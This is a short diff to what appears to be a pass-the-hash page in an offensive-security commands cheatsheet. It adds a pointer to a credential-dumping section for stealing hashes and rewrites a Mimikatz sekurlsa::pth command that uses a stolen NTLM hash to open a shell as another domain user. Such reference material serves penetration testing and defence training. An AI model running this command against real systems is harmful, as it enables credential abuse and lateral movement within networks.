@@ -1,15 +1,13 @@
 # Pass the Hash
 
-:::tip
-
 Follow [this link](/lateral-movement/windows/pass-the-hash) to access the Pass the Hash section.
 
-:::
+You can steal the hashes by following the [Dumping Credentials](/commands-cheatsheet/windows/dumping-credentials) section.
 
 ## Mimikatz
 
 ```batch
-mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" exit
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" "exit"
 ```
 
 ## Invoke-TheHash
